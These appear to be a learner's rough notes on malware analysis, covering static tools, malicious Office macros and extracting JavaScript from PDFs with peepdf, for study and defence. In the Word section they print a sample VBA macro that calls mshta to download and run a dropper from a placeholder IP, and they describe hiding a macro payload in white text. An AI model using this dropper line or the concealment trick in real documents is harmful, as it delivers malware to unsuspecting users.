Data carving, also known as file carving, is the forensic technique of reassembling files from raw data fragments when no filesystem metadata is available.

STRINGS--
You'll find that programs often contain large amount of strings and using the "strings" tool from sysinternals may only display 10% of these...

...That and it's not exactly practical scrolling up through a terminal for stuff like this - we are on Windows afterall! There's a GUI tool for that.

Launch the application within "Tools/Static/PE Tools/PE Explorer

Where you will be presented with the following, indicating that it has successfully imported:

After import. Navigate to "View -> Imports"

ida 
IDA Freeware is arguable as the tool can be used for both static and dynamic analysis. 

MSI is an installer package file format used by Windows. 

Basic RE room
#~  7z x <filename>


WORD----
The Change in Focus from APT's

Malware infection via malicious macros (or scripts within Microsoft Office products such as Word and Excel) are some of the most successful attacks to date.

For example, current APT campaigns such as Emotet, QuickBot infect users by sending seemingly legitimate documents attached to emails i.e. an invoice for business. However, once opened, execute malicious code without the user knowing. This malicious code is often used in what's known as a "dropper attack", where additional malicious programs are downloaded onto the host.

Take the document file below as an example:

Looks perfectly okay, right? Well in actual fact, this word document has just downloaded a ransomware file from a malicious IP address in the background, with not much more than this snippet of code:

  Private Sub Howdy()
      Shell ("cmd /c mshta http://x.x.x.x/MyDropper.exe")
  End Sub
 have programmed the script to show a pop-up for demonstration purposes. However, in real life, this would be done without any popup.
 Luckily for me, this EXE is safe. Unfortunately in the real-world, this EXE could start encrypting my files. 

Thankfully Anti-Viruses these days are pretty reliable on picking up that sort of activity when it is left in plaintext. The following example uses two-stages to execute an obfuscated payload code.

The macro starts once edit permissions ("Enable Edit" or "Enable Content")have enabled edit mode on the Word document
The macro executes the payload stored in the text within the document.
The downside to this? You need a large amount of text to be contained within the page, users will be suspicious and not proceed with editing the document.

Although, just put on your steganography hat...Authors can just remove the borders from the text box and make the text white. The macro doesn't need the text to be visible to the user, it just needs to exist on the page.

First, we will analyse a suspicious Microsoft Office Word document together. We can simply use REMnux's "vmonkey" which is a parser engine that is capable of analysing visual basic macros without executing (opening the document).
By using "vmonkey DefinitelyALegitInvoice.doc" vmonkey has detected potentially malicious visual basic code within a macro.

 
PDF-----
DF's are capable of containing many more types of code that can be executed without the user's knowledge. This includes:

Javascript
Python
Executables
Powershell Shellcode

We'll be using 'peepdf' to begin a precursory analysis of a PDF file to determine the presence of Javascript. If there is, we will extract this Javascript code (without executing it) for our inspection.

We can simply do "peepdf demo_notsuspicious.pdf"

o extract this Javascript, we can use peepdf's "extract" module. This requires a few steps to set up but is fairly trivial.

The following command will create a script file for 'peepdf' to use:

      "echo 'extract js > javascript-from-demo_notsuspicious.pdf' > extracted_javascript.txt"

when placing the text "extract js > javascript-from-demo_notsuspicious.pdf" in a file and passing that file to peepdf, it will execute the cmd to extract
The script will extract all javascript via extract js and pipe > the contents into "javascript-from-demo_notsuspicious.pdf"

We now need to tell peepdf the name of the script (extracted_javascript.txt) and the PDF file that we want to extract from (demo_notsuspicious.pdf): 

    "peepdf -s extracted_javascript.txt demo_notsuspicious.pdf"
    
Remembering that the Javascript will output into a file called "javascript-from-demo_nonsuspicious.pdf" because of our script.

To recap: "extracted_javascript.txt" (highlighted in red) is our script, where "demo_notsuspicious.pdf" (highlighted in green) is the original PDF file that we think is malicious.

You will see an output, in this case, a file named "javascript-from-demo_notsuspicious" (highlighted in yellow). This file now contains our extracted Javascript, we can simply cat this to see the contents.
  'cat javascript-from-demo_notsuspicious.pdf'
  







